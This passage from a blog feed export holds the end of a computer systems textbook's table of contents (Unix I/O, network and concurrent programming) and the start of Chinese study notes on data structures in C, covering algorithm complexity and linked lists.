<h2 id="10-1-Unix-I-O-926"><a href="#10-1-Unix-I-O-926" class="headerlink" title="10.1 Unix I/O 926"></a>10.1 Unix I/O 926</h2><h2 id="10-2-Files-927"><a href="#10-2-Files-927" class="headerlink" title="10.2 Files 927"></a>10.2 Files 927</h2><h2 id="10-3-Opening-and-Closing-Files-929"><a href="#10-3-Opening-and-Closing-Files-929" class="headerlink" title="10.3 Opening and Closing Files 929"></a>10.3 Opening and Closing Files 929</h2><h2 id="10-4-Reading-and-Writing-Files-931"><a href="#10-4-Reading-and-Writing-Files-931" class="headerlink" title="10.4 Reading and Writing Files 931"></a>10.4 Reading and Writing Files 931</h2><h2 id="10-5-Robust-Reading-and-Writing-with-the-Rio-Package-933"><a href="#10-5-Robust-Reading-and-Writing-with-the-Rio-Package-933" class="headerlink" title="10.5 Robust Reading and Writing with the Rio Package 933"></a>10.5 Robust Reading and Writing with the Rio Package 933</h2><p>10.5.1 Rio Unbuffered Input and Output Functions 933<br>10.5.2 Rio Buffered Input Functions 934</p>
<h2 id="10-6-Reading-File-Metadata-939"><a href="#10-6-Reading-File-Metadata-939" class="headerlink" title="10.6 Reading File Metadata 939"></a>10.6 Reading File Metadata 939</h2><h2 id="10-7-Reading-Directory-Contents-941"><a href="#10-7-Reading-Directory-Contents-941" class="headerlink" title="10.7 Reading Directory Contents 941"></a>10.7 Reading Directory Contents 941</h2><h2 id="10-8-Sharing-Files-942"><a href="#10-8-Sharing-Files-942" class="headerlink" title="10.8 Sharing Files 942"></a>10.8 Sharing Files 942</h2><h2 id="10-9-I-O-Redirection-945"><a href="#10-9-I-O-Redirection-945" class="headerlink" title="10.9 I/O Redirection 945"></a>10.9 I/O Redirection 945</h2><h2 id="10-10-Standard-I-O-947"><a href="#10-10-Standard-I-O-947" class="headerlink" title="10.10 Standard I/O 947"></a>10.10 Standard I/O 947</h2><h2 id="10-11-Putting-It-Together-Which-I-O-Functions-Should-I-Use-947"><a href="#10-11-Putting-It-Together-Which-I-O-Functions-Should-I-Use-947" class="headerlink" title="10.11 Putting It Together: Which I/O Functions Should I Use? 947"></a>10.11 Putting It Together: Which I/O Functions Should I Use? 947</h2><h2 id="10-12-Summary-949"><a href="#10-12-Summary-949" class="headerlink" title="10.12 Summary 949"></a>10.12 Summary 949</h2><p>Bibliographic Notes 950 Homework Problems 950 Solutions to Practice Problems 951</p>
<h1 id="Chapter-11-Network-Programming"><a href="#Chapter-11-Network-Programming" class="headerlink" title="Chapter 11: Network Programming"></a>Chapter 11: Network Programming</h1><blockquote>
<p>第 11 章:网络编程。对编程而言，网络是非常有趣的 I/O设备，它将许多我们前面 文中学习的概念(比如进程、信号、字节顺序、内存映射和动态内存分配)联系在一起。</p>
<p>网络程序还为下一章的主题——并发，提供了一个很令人信服的上下文。本章只是网络编程的一个很小的部分，使读者能够编写一个简单的 Web 服务器。我们还讲述位于 所有网络程序底层的客户端-服务器模型。我们展现了一个程序员对 Internet 的观点， 并且教读者如何用套接字接口来编写 Internet 客户端和服务器。最后，我们介绍超文 本传输协议(HTTP),并开发了一个简单的迭代式Web服务器。</p>
</blockquote>
<h2 id="11-1-The-Client-Server-Programming-Model-954"><a href="#11-1-The-Client-Server-Programming-Model-954" class="headerlink" title="11.1 The Client-Server Programming Model 954"></a>11.1 The Client-Server Programming Model 954</h2><h2 id="11-2-Networks-955"><a href="#11-2-Networks-955" class="headerlink" title="11.2 Networks 955"></a>11.2 Networks 955</h2><h2 id="11-3-The-Global-IP-Internet-960"><a href="#11-3-The-Global-IP-Internet-960" class="headerlink" title="11.3 The Global IP Internet 960"></a>11.3 The Global IP Internet 960</h2><p>11.3.1 IP Addresses 961<br>11.3.2 Internet Domain Names 963<br>11.3.3 Internet Connections 965</p>
<h2 id="11-4-The-Sockets-Interface-968"><a href="#11-4-The-Sockets-Interface-968" class="headerlink" title="11.4 The Sockets Interface 968"></a>11.4 The Sockets Interface 968</h2><p>11.4.1 Socket Address Structures 969<br>11.4.2 The socket Function 970<br>11.4.3 The connect Function<br>11.4.4 The bind Function 971<br>11.4.5 The listen Function 971<br>11.4.6 The accept Function 972<br>11.4.7 Host and Service Conversion 973<br>11.4.8 Helper Functions for the Sockets Interface 978<br>11.4.9 Example Echo Client and Server 980</p>
<h2 id="11-5-Web-Servers-984"><a href="#11-5-Web-Servers-984" class="headerlink" title="11.5 Web Servers 984"></a>11.5 Web Servers 984</h2><p>11.5.1 Web Basics 984<br>11.5.2 Web Content 985<br>11.5.3 HTTP Transactions 986<br>11.5.4 Serving Dynamic Content 989</p>
<h2 id="11-6-Putting-It-Together-The-Tiny-Web-Server-992"><a href="#11-6-Putting-It-Together-The-Tiny-Web-Server-992" class="headerlink" title="11.6 Putting It Together: The Tiny Web Server 992"></a>11.6 Putting It Together: The Tiny Web Server 992</h2><h2 id="11-7-Summary-1000"><a href="#11-7-Summary-1000" class="headerlink" title="11.7 Summary 1000"></a>11.7 Summary 1000</h2><p>Bibliographic Notes 1001 Homework Problems 1001 Solutions to Practice Problems 1002</p>
<h1 id="Chapter-12-Concurrent-Programming"><a href="#Chapter-12-Concurrent-Programming" class="headerlink" title="Chapter 12: Concurrent Programming"></a>Chapter 12: Concurrent Programming</h1><blockquote>
<p>第 12 章:并发编程。这一章以 Internet 服务器设计为例介绍了并发编程。我们比较 对照了三种编写并发程序的基本机制(进程、I/O多路复用和线程)，并且展示如何用 它们来建造并发 Internet 服务器。我们探讨了用 Pÿ V 信号量操作来实现同步、线程 安全和可重入、竞争条件以及死锁等的基本原则。对大多数服务器应用来说，写并发 代码都是很关键的。我们还讲述了线程级编程的使用方法，用这种方法来表达应用程 序中的并行性，使得程序在多核处理器上能执行得更快。使用所有的核解决同一个计 算问题需要很小心谨慎地协调并发线程，既要保证正确性，又要争取获得高性能。</p>
</blockquote>
<h2 id="12-1-Concurrent-Programming-with-Processes-1009"><a href="#12-1-Concurrent-Programming-with-Processes-1009" class="headerlink" title="12.1 Concurrent Programming with Processes 1009"></a>12.1 Concurrent Programming with Processes 1009</h2><p>12.1.1 A Concurrent Server Based on Processes 1010<br>12.1.2 Pros and Cons of Processes 1011</p>
<h2 id="12-2-Concurrent-Programming-with-I-O-Multiplexing-1013"><a href="#12-2-Concurrent-Programming-with-I-O-Multiplexing-1013" class="headerlink" title="12.2 Concurrent Programming with I/O Multiplexing 1013"></a>12.2 Concurrent Programming with I/O Multiplexing 1013</h2><p>12.2.1 A Concurrent Event-Driven Server Based on I/O<br>Multiplexing 1016<br>12.2.2 Pros and Cons of I/O Multiplexing 1021</p>
<h2 id="12-3-Concurrent-Programming-with-Threads-1021"><a href="#12-3-Concurrent-Programming-with-Threads-1021" class="headerlink" title="12.3 Concurrent Programming with Threads 1021"></a>12.3 Concurrent Programming with Threads 1021</h2><p>12.3.1 Thread Execution Model 1022<br>12.3.2 Posix Threads 1023<br>12.3.3 Creating Threads 1024<br>12.3.4 Terminating Threads 1024<br>12.3.5 Reaping Terminated Threads 1025<br>12.3.6 Detaching Threads 1025<br>12.3.7 Initializing Threads 1026<br>12.3.8 A Concurrent Server Based on Threads 1027</p>
<h2 id="12-4-Shared-Variables-in-Threaded-Programs-1028"><a href="#12-4-Shared-Variables-in-Threaded-Programs-1028" class="headerlink" title="12.4 Shared Variables in Threaded Programs 1028"></a>12.4 Shared Variables in Threaded Programs 1028</h2><p>12.4.1 Threads Memory Model 1029<br>12.4.2 Mapping Variables to Memory 1030<br>12.4.3 Shared Variables 1031</p>
<h2 id="12-5-Synchronizing-Threads-with-Semaphores-1031"><a href="#12-5-Synchronizing-Threads-with-Semaphores-1031" class="headerlink" title="12.5 Synchronizing Threads with Semaphores 1031"></a>12.5 Synchronizing Threads with Semaphores 1031</h2><p>12.5.1 Progress Graphs 1035<br>12.5.2 Semaphores 1037<br>12.5.3 Using Semaphores for Mutual Exclusion 1038<br>12.5.4 Using Semaphores to Schedule Shared Resources 1040<br>12.5.5 Putting It Together: A Concurrent Server Based on</p>
<h2 id="12-6-Using"><a href="#12-6-Using" class="headerlink" title="12.6 Using"></a>12.6 Using</h2><h2 id="12-7-Other"><a href="#12-7-Other" class="headerlink" title="12.7 Other"></a>12.7 Other</h2><p>Prethreading 1044<br>Threads for Parallelism 1049 Concurrency Issues 1056<br>12.7.1 Thread Safety 1056<br>12.7.2 Reentrancy 1059<br>12.7.3 Using Existing Library Functions in Threaded Programs 1060<br>12.7.4 Races 1061<br>12.7.5 Deadlocks 1063</p>
<h2 id="12-8-Summary-1066-Bibliographic-Notes-1066"><a href="#12-8-Summary-1066-Bibliographic-Notes-1066" class="headerlink" title="12.8 Summary 1066 Bibliographic Notes 1066"></a>12.8 Summary 1066 Bibliographic Notes 1066</h2><p>Homework Problems 1067 Solutions to Practice Problems 1072</p>
]]></content>
      <tags>
        <tag>Notes</tag>
        <tag>Computer Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>三万字告诉你什么是「数据结构」</title>
    <url>/Data-Structures-Notes/</url>
    <content><![CDATA[<p>《数据结构（C语言版）》（严蔚敏，清华大学出版社）笔记</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<p>具体算法参见<a href="https://www.superpung.xyz/Data-Structures-Experiments/">数据结构实验</a>。</p>
<h1 id="第1章-绪论"><a href="#第1章-绪论" class="headerlink" title="第1章 绪论"></a>第1章 绪论</h1><ol>
<li>计算机加工处理的对象由纯粹的数值发展到字符、表格和图像等各种<strong>具有一定结构</strong>的数据，这就给程序设计带来一些新的问题。为编写出一个“好”的程序，必须分析待处理的对象的特性以及各处理对象之间存在的关系。</li>
<li>数据的<strong>存储结构</strong>分为：<ul>
<li>顺序存储（如数组）</li>
<li>链式存储（如链表）</li>
<li>索引存储</li>
<li>散列存储（如哈希表）</li>
</ul>
</li>
<li>数据的<strong>逻辑结构</strong>分为：<ul>
<li>线性结构<ul>
<li>一般线性表<ul>
<li>顺序表</li>
<li>链表</li>
</ul>
</li>
<li>栈（受限线性表）<ul>
<li>顺序栈</li>
<li>链栈</li>
</ul>
</li>
<li>队列（受限线性表）<ul>
<li>循环队列</li>
<li>链队列</li>
</ul>
</li>
<li>串（受限线性表）</li>
<li>数组（线性表推广）</li>
<li>广义表（线性表推广）</li>
</ul>
</li>
<li>非线性结构<ul>
<li>集合</li>
<li>树<ul>
<li>一般树</li>
<li>二叉树</li>
</ul>
</li>
<li>图<ul>
<li>有向图</li>
<li>无向图</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>算法定义在逻辑结构上，实现在存储结构上。</li>
</ol>
<h2 id="1-1-什么是数据结构"><a href="#1-1-什么是数据结构" class="headerlink" title="1.1 什么是数据结构"></a>1.1 什么是数据结构</h2><ol>
<li><p>一般来说，用计算机解决一个具体问题时，首先需要从具体问题<strong>抽象</strong>出一个适当的<strong>数学模型</strong>，然后设计一个解此数学模型的<strong>算法</strong>，最后编出程序，进行测试、调整直至得到最终解答。</p>
</li>
<li><p>寻求数学模型的实质是分析问题，从中<strong>提取</strong>操作的对象，并找出这些对象之间含有的<strong>关系</strong>，然后用<strong>数学语言</strong>加以描述，数学语言包括线性方程组、微分方程等。</p>
</li>
<li><p>但更多的非数值计算问题无法用数学方程加以描述，如图书馆的书目检索系统自动化问题（线性结构、表）、计算机和人对弈问题（非线性结构、树）、多叉路口交通灯的管理问题（图）等。</p>
</li>
<li><p>可以看出描述这类非数值计算问题的数学模型不再是数学方程，而是诸如表、树和图之类的数据结构。因此，简单说来，数据结构是一门研究<strong>非数值计算</strong>的程序设计问题中计算机的<strong>操作对象</strong>以及它们之间的<strong>关系</strong>和<strong>操作</strong>等的学科。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%9C%B0%E4%BD%8D.png" alt="数据结构地位"></p>
</li>
<li><p>在计算机科学中，数据结构不仅是一般程序设计（特别是非数值计算的程序设计）的基础，而且是设计和实现编译程序、操作系统、数据库系统及其他应用程序和大型应用程序的重要基础。</p>
</li>
</ol>
<h2 id="1-2-基本概念和术语"><a href="#1-2-基本概念和术语" class="headerlink" title="1.2 基本概念和术语"></a>1.2 基本概念和术语</h2><ol>
<li><p><strong>数据（data）</strong>是对客观事物的<strong>符号表示</strong>，在计算机科学中是指所有能输入到计算机中并被计算机程序处理的符号的总称，包括图像、声音等。它是计算机程序加工的“原料”。</p>
</li>
<li><p><strong>数据元素（data element）</strong>是数据的基本单位，可由若干个<strong>数据项（data item）</strong>组成。数据项是数据的不可分割的最小单位。</p>
</li>
<li><p><strong>数据对象（data object）</strong>是<strong>性质相同</strong>的数据元素的集合，是数据的一个子集。</p>
</li>
<li><p><strong>数据结构（data structure）</strong>是相互之间存在一种或多种<strong>特定关系</strong>的数据元素的集合，可以分为4类基本结构：集合（同类）、线性结构（一对一）、树形结构（一对多）和图状结构（网状结构，多对多）。</p>
</li>
<li><p>数据结构的形式定义为：数据结构是一个二元组<code>Data Structure=(D,S)</code>，<code>D</code>是数据元素的有限集，<code>S</code>是<code>D</code>上关系的有限集。</p>
</li>
<li><p>上面提到的“关系”都是数据元素之间的逻辑关系，又称为数据的<strong>逻辑结构</strong>。然而还需要研究这种结构在计算机中是如何实现的，即其<strong>物理结构</strong>（<strong>存储结构</strong>）。</p>
</li>
<li><p>在计算机中，可以用若干位的串表示一个数据元素（如8位二进制表示一个字符），称这个位串为<strong>元素（element）</strong>或<strong>结点（node）</strong>。当数据元素由若干数据项组成时，位串中对应于各个数据项的子位串称为<strong>数据域（data field）</strong>。</p>
</li>
<li><p>数据元素之间的关系在计算机中可表示为顺序映像和非顺序映像，对应顺序存储结构和链式存储结构。顺序映像的特点是借助<strong>元素在存储器中的相对位置</strong>来表示数据元素之间的逻辑关系，非顺序映像的特点是借助指示元素存储地址的<strong>指针（pointer）</strong>表示数据元素之间的逻辑关系。</p>
</li>
<li><p>数据的逻辑结构和物理结构密切相关，任何一个算法的设计取决于选定的数据（逻辑）结构，而算法的实现依赖于采用的逻辑（物理）结构。</p>
</li>
<li><p>将C语言看成是一个执行C指令和C数据类型的虚拟处理器，后续讨论的存储结构就是数据结构在C虚拟处理器中的表示，不妨称之为虚拟存储结构。</p>
</li>
<li><p><strong>数据类型（data type）</strong>和数据结构密切相关，是一个<strong>值的集合</strong>和定义在这个值集上的<strong>一组操作</strong>的总称。</p>
</li>
<li><p>按照“值”的不同特性，高级程序语言中的数据类型可分为两类：</p>
<ul>
<li>一类是非结构的<strong>原子类型</strong>，不可分解，如C中的基本类型（整型、实型、字符型和枚举类型）、指针类型和空类型。</li>
<li>另一类是<strong>结构类型</strong>，由若干成分按某种结构组成，可以分解，并且其成分可以是结构的，也可以是非结构的。如数组的每个分量可以是整数，也可以是数组等。</li>
</ul>
<p>在某种意义上，数据结构可以看成是“一组具有相同结构的值”，则结构类型可以看成由一种数据结构和定义在其上的一组操作组成。</p>
</li>
<li><p>实际上，在计算机中，数据类型的概念并非局限于高级语言中，每个处理器（包括计算机硬件系统、操作系统、高级语言、数据库等）都提供了一组原子类型或结构类型。</p>
</li>
<li><p>引入“数据类型”，将用户不必了解的细节都封装在类型中，实现了信息的隐蔽。</p>
</li>
<li><p><strong>抽象数据类型（Abstract Data Type，ADT）</strong>是指一个数学模型以及定义在该模型上的一组操作。</p>
</li>
<li><p>为了提高软件的复用率，近代程序设计方法学指出，一个软件系统的框架应建立在<strong>数据</strong>之上，而不是建立在<strong>操作</strong>之上。即在构成软件系统的每个相对独立的模块上，定义一组数据和施于这些数据上的一组操作，并在模块内部给出这些数据的表示及其操作的细节，而在模块外部使用的只是抽象的数据和抽象的操作。</p>
<p>显然，所定义的数据类型的抽象层次越高，含有该抽象数据类型的软件模块的复用程度也就越高。</p>
</li>
<li><p>一个含抽象数据类型的软件模块通常应包含<strong>定义</strong>、<strong>表示</strong>和<strong>实现</strong>3个部分。</p>
</li>
<li><p>抽象数据类型的值可以分为：</p>
<ul>
<li><strong>原子类型（atomic data type）</strong>：属原子类型的变量的值是不可分解的。这类抽象数据类型较少，因为一般已有的固有数据类型足以满足需求。</li>
<li><strong>固定聚合类型（fixed-aggregate data type）</strong>：属此类型的变量，其值由<strong>确定数目</strong>的成分按某种结构组成。如复数是由两个实数依确定的次序关系构成。</li>
<li><strong>可变聚合类型（variable-aggregate data type）</strong>：“可变”是指其值的成分的<strong>数目不确定</strong>。如一个有序整数序列的抽象数据类型中，序列的长度是可变的。</li>
</ul>
<p>后两种类型可统称为<strong>结构类型</strong>。</p>
</li>
<li><p>和数据结构的形式定义相对应，抽象数据类型可用三元组<code>(D,S,P)</code>表示。其中，<code>D</code>是数据对象，<code>S</code>是<code>D</code>上的关系集，<code>P</code>是对<code>D</code>的基本操作集。</p>
</li>
<li><p><strong>多形数据类型（polymorphic data type）</strong>是指其值的成分不确定的数据类型。</p>
</li>
</ol>
<h2 id="1-3-抽象数据类型的表示与实现"><a href="#1-3-抽象数据类型的表示与实现" class="headerlink" title="1.3 抽象数据类型的表示与实现"></a>1.3 抽象数据类型的表示与实现</h2><ol>
<li><p>抽象数据类型可以通过固有数据类型来表示和实现。</p>
</li>
<li><p>后续使用类C语言描述，精选了C语言的一个核心子集，同时做了若干扩充修改：</p>
<ul>
<li><p>预定义常量和类型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INFEASIBLE -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OVERFLOW -2</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> Status</span><br></pre></td></tr></table></figure></li>
<li><p>数据结构的表示（存储结构）用类型定义<code>typedef</code>描述；</p>
</li>
<li><p>当函数返回值为函数结果状态代码时，函数定义为<code>Status</code>类型；</p>
</li>
<li><p><code>exit(异常代码)</code>为异常结束语句；</p>
</li>
</ul>
</li>
</ol>
<h2 id="1-4-算法和算法分析"><a href="#1-4-算法和算法分析" class="headerlink" title="1.4 算法和算法分析"></a>1.4 算法和算法分析</h2><h3 id="1-4-1-算法"><a href="#1-4-1-算法" class="headerlink" title="1.4.1 算法"></a>1.4.1 算法</h3><p><strong>算法（algorithm）</strong>是对特定问题求解步骤的一种描述，是指令的<strong>有限序列</strong>，有下列5个重要特性：</p>
<ul>
<li><strong>有穷性</strong>：对任何合法的输入值，在执行有穷步后结束、每一步都可在有穷时间内完成；</li>
<li><strong>确定性</strong>：每一条指令必须有确切含义，且只有唯一的一条执行路径，对相同的输入只能得出相同的输出；</li>
<li><strong>可行性</strong>：算法中的操作都是可以通过已经实现的基本运算执行有限次来实现的；</li>
<li><strong>输入</strong>：有零个或多个的输入；</li>
<li><strong>输出</strong>：有一个或多个的输出。</li>
</ul>
<h3 id="1-4-2-算法设计的要求"><a href="#1-4-2-算法设计的要求" class="headerlink" title="1.4.2 算法设计的要求"></a>1.4.2 算法设计的要求</h3><ul>
<li><strong>正确性（correctness）</strong>：不含语法错误、对于几组输入数据得到满足要求的结果、对于典型苛刻刁难的几组输入数据得到满足要求的结果、对于一切合法的输入数据得到满足要求的结果；</li>
<li><strong>可读性（readability）</strong>；</li>
<li><strong>健壮性（robustness）</strong>：对输入的非法数据能适当做出反应或进行处理，不会产生莫名其妙的输出结果；</li>
<li><strong>效率与低存储量需求</strong>：执行时间短、存储空间小。</li>
</ul>
<h3 id="1-4-3-算法效率的度量"><a href="#1-4-3-算法效率的度量" class="headerlink" title="1.4.3 算法效率的度量"></a>1.4.3 算法效率的度量</h3><ol>
<li><p>度量一个程序的执行时间：</p>
<ul>
<li>事后统计；</li>
<li>事前分析估算，取决于：<ul>
<li>算法选用的策略；</li>
<li>问题的规模；</li>
<li>程序语言（语言级别越高，执行效率越低）；</li>
<li>编译产生的机器代码的质量；</li>
<li>机器执行指令的速度。</li>
</ul>
</li>
</ul>
</li>
<li><p>撇开其他因素，认为算法的“运行工作量”的大小只依赖于<strong>问题的规模</strong>（用整数量<code>n</code>表示），即是问题规模的函数。</p>
</li>
<li><p>一个算法是由<strong>控制结构</strong>（顺序、分支和循环）和原操作构成的，所以选取一种原操作，以该操作重复执行的次数作为算法的时间量度。</p>
</li>
<li><p>形式定义：若$f(n)$是正整数$n$的一个函数，则$x_{n}=O(f(n))$表示存在一个正的常数$M$，使得当$n\ge n_{0}$时都满足$|x_{n}|\le M|f(n)|$。</p>
</li>
<li><p>一般情况下，算法中基本操作重复执行的次数是问题规模$n$的某个函数$f(n)$，算法的时间量度记作$$T(n)=O(f(n))$$它表示随问题规模$n$的增大，<strong>算法执行时间的增长率和$f(n)$的增长率相同</strong>，称做算法的<strong>渐近时间复杂度（asymptotic time complexity）</strong>，简称<strong>时间复杂度</strong>。</p>
</li>
<li><p>算法原操作的执行次数和包含它的语句的频度（语句重复执行的次数）相同。</p>
</li>
<li><p>O(1)、O(n)、O($n^2$)分别被称为常量阶、线性阶和平方阶。下图是常见函数的增长率：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E7%9A%84%E5%A2%9E%E9%95%BF%E7%8E%87.png" alt="常见函数的增长率"></p>
</li>
<li><p>一般情况下，对一个问题（或一类算法）只需选择一种基本操作来讨论算法的时间复杂度即可，有时也需要同时考虑几种基本操作，甚至可以对不同操作赋予不同权值。</p>
</li>
<li><p>若难以精确计算基本操作执行次数（或语句频度），则只需求出它关于$n$的增长率或阶即可（增长最快的项）。</p>
</li>
<li><p>若基本操作重复执行的次数随问题的输入数据集不同而不同，则计算它的平均值（期望值），或计算算法在最坏情况下的时间复杂度（上界）。默认计算最坏情况。</p>
</li>
<li><p>算法的时间复杂度取决于<strong>问题的规模</strong>和<strong>待处理数据的状态</strong>。</p>
</li>
<li><p>数据的（不可分割的）最小单位是<strong>数据项</strong>。</p>
</li>
<li><p>算法可以用不同的语言描述，如果用C语言或PASCAL语言等高级语言来描述，则算法实际上就是程序了。这种说法是错误的，因为程序不等同于算法，而是数据结构和算法的结合。</p>
</li>
<li><p>某算法的时间复杂度为O($n^2$)，表明该<strong>算法的执行时间与$n^{2}$成正比</strong>。</p>
</li>
</ol>
<h3 id="1-4-4-算法的存储空间需求"><a href="#1-4-4-算法的存储空间需求" class="headerlink" title="1.4.4 算法的存储空间需求"></a>1.4.4 算法的存储空间需求</h3><ol>
<li><strong>空间复杂度（space complexity）</strong>为算法所需存储空间的量度，记作$$S(n)=O(f(n))$$其中$n$为问题的规模（大小）。</li>
<li>程序除了存储自身的空间外，还需要一些对数据进行操作的工作单元和存储一些为实现计算所需信息的辅助空间。</li>
<li>若额外空间相对于输入数据量来说是常数，则称此算法为<strong>原地工作</strong>，如某些排序算法。</li>
</ol>
<h1 id="第2章-线性表"><a href="#第2章-线性表" class="headerlink" title="第2章 线性表"></a>第2章 线性表</h1><p>第2章～第4章讨论线性结构，其特点是：在数据元素的非空有限集中，</p>
<ul>
<li>存在<strong>唯一的一个</strong>被称作“第一个”的数据元素；</li>
<li>存在<strong>唯一的一个</strong>被称作“最后一个”的数据元素；</li>
<li>除第一个外，集合中的每个数据元素均<strong>只有一个</strong>前驱；</li>
<li>除最后一个之外，集合中每个数据元素均<strong>只有一个</strong>后继。</li>
</ul>
<h2 id="2-1-线性表的类型定义"><a href="#2-1-线性表的类型定义" class="headerlink" title="2.1 线性表的类型定义"></a>2.1 线性表的类型定义</h2><ol>
<li><strong>线性表（linear list）</strong>是最常用且最简单的一种数据结构，是n个数据元素的有限序列，其中的数据元素可以由若干个<strong>数据项（item）</strong>组成。数据元素常被称为<strong>记录（record）</strong>，含有大量记录的线性表又被称为<strong>文件（file）</strong>。</li>
<li>同一线性表中的元素必定具有相同的特性，即属同一数据对象，相邻数据元素之间存在着序偶关系（直接前驱、直接后继）。</li>
<li>线性表中元素的个数定义为线性表的长度（为零时称为空表），下标称为数据元素在线性表中的位序。</li>
</ol>
<h2 id="2-2-线性表的顺序表示和实现"><a href="#2-2-线性表的顺序表示和实现" class="headerlink" title="2.2 线性表的顺序表示和实现"></a>2.2 线性表的顺序表示和实现</h2><ol>
<li>线性表的顺序表示就是用一组<strong>地址连续的存储单元</strong>依次存储线性表中的数据元素。</li>
<li>不要认为顺序表就是数组。数组是一种顺序表。</li>
<li>注意存储位置的计算。</li>
<li>线性表的这种机内表示称做线性表的<strong>顺序存储结构</strong>或<strong>顺序映像（sequential mapping）</strong>，以元素在计算机内<strong>物理位置相邻</strong>来表示线性表中数据元素之间的逻辑关系。</li>
<li>只要确定了存储线性表的起始位置，线性表中任意数据元素都可随机存取，所以线性表的存储结构是一种随机存取的结构。</li>
<li>通常用数组描述数据结构中的顺序存储结构，长度可变时可用动态分配的一维数组。</li>
<li>顺序存储的线性表的插入和删除操作的时间主要耗费在移动元素上（基本操作），移动元素的个数取决于插入或删除元素的位置。</li>
<li>长度为n的顺序表，插入的位置有n+1种，删除的位置有n种。</li>
<li>假设顺序表所有位置的插入和删除是等概率的，则插入和删除的平均移动次数分别为$\frac {n}{2}$和$\frac {n-1}{2}$。</li>
<li>表长为n时，插入和删除表元素的时间复杂度为O(n)，求表长和取某一数据元素的时间复杂度均为O(1)。</li>
<li>若以线性表表示集合并进行集合的各种运算，应先对表中元素进行排序。</li>
</ol>
<h2 id="2-3-线性表的链式表示和实现"><a href="#2-3-线性表的链式表示和实现" class="headerlink" title="2.3 线性表的链式表示和实现"></a>2.3 线性表的链式表示和实现</h2><p>顺序表的优点是可以随机存取表中任一元素，缺点是插入或删除元素时需要移动大量元素。</p>
<h3 id="2-3-1-线性链表"><a href="#2-3-1-线性链表" class="headerlink" title="2.3.1 线性链表"></a>2.3.1 线性链表</h3><ol>
<li><p>线性表的链式存储结构的特点是用一组<strong>任意的</strong>存储单元存储线性表的数据元素（可连续，也可不连续）。</p>
</li>
<li><p>链表中每个数据元素与其直接后继元素之间的逻辑关系需要单独表示，故每个数据元素需要存储<strong>本身</strong>的信息，还需要存储一个指示其<strong>直接后继的存储位置</strong>的信息，这两部分信息组成每一个数据元素的存储映像，称为<strong>结点（node）</strong>。</p>
</li>
<li><p>结点包括两个域：</p>
<ul>
<li><strong>数据域</strong>：存储数据元素的信息；</li>
<li><strong>指针域</strong>：存储直接后继存储位置的信息（称为<strong>指针</strong>或<strong>链</strong>）。</li>
</ul>
</li>
<li><p>若干个结点链结成一个链表，由于每个结点只包含一个指针域，又称<strong>线性链表</strong>或<strong>单链表</strong>。</p>
</li>
<li><p>单链表的存取必须从头指针开始进行，最后一个结点的指针为“空”。</p>
</li>
<li><p>线性链表的数据元素之间的逻辑关系由结点中的指针指示，即指针为数据元素之间的逻辑关系的映像。这种存储结构为非顺序映像或链式映像。</p>
</li>
<li><p><code>typedef struct LNode&#123;&#125;LNode, *LinkList;</code>包含两步操作：<code>struct LNode&#123;&#125;;</code>和<code>LNode *LinkList;</code>。</p>
</li>
<li><p>有时在单链表的第一个结点之前附设一个结点，称之为<strong>头结点</strong>。其数据域可以不存储任何信息，也可以存储一些附加信息（如表的长度）；其指针域存储指向第一个结点的指针。</p>
</li>
<li><p>单链表是非随机存取的存储结构。</p>
</li>
<li><p>单链表的插入操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = s;</span><br></pre></td></tr></table></figure>
<p>单链表的删除操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;next = p-&gt;next-&gt;next;</span><br></pre></td></tr></table></figure>
<p>仅需修改指针，无需移动元素。首先需要找到插入或删除的位置，故时间复杂度为O(n)。</p>
</li>
<li><p>单链表和顺序表不同，是一种动态结构（<code>malloc</code>分配、<code>free</code>回收）。</p>
</li>
<li><p>归并链表时空间复杂度比顺序表的小，因为无需另建新表的结点空间，只需修改指针以链接成一个链表即可。</p>
</li>
<li><p>也可用一维数组来描述线性链表，此时指针域为<code>int</code>型，即为数组下标。缺点是仍需预先分配一个较大的空间，但仍保留了插入和删除的主要优点。这就是<strong>静态链表</strong>。</p>
</li>
<li><p>静态链表中，为了辨明数组中哪些分量未被使用，可以将所有未被使用过以及被删除的分量用游标链成一个备用的链表。</p>
</li>
</ol>
<h3 id="2-3-2-循环链表"><a href="#2-3-2-循环链表" class="headerlink" title="2.3.2 循环链表"></a>2.3.2 循环链表</h3><ol>
<li><strong>循环链表（circular linked list）</strong>是另一种形式的链式存储结构，特点是表中最后一个结点的指针域指向头结点，整个链表形成一个环，从表中任一结点出发均可找到表中其他结点。</li>
<li>循环条件为判断<code>p</code>或<code>p-&gt;next</code>是否等于头指针，也可不设头指针，只设尾指针，此时将两个线性表合并成一个线性表时仅需改变两个指针值，时间复杂度为O(1)。</li>
</ol>
<h3 id="2-3-3-双向链表"><a href="#2-3-3-双向链表" class="headerlink" title="2.3.3 双向链表"></a>2.3.3 双向链表</h3><ol>
<li>单链表的缺点是寻查结点的直接前驱的时间复杂度为O(n)。</li>
<li><strong>双向链表（double linked list）</strong>的结点中有两个指针域，分别指向直接后继和直接前驱，也可以有循环表。</li>
<li>双向链表在插入和删除结点时需要修改两个方向上的指针，时间复杂度均为O(n)。</li>
<li>由于链表的空间利用合理，插入和删除时不需要移动等优点，是线性表的首选存储结构。</li>
<li>链表的缺点是求长度时不如顺序表、结点之间的关系用指针表示导致数据元素在线性表中的“位序”的概念已淡化。</li>
</ol>
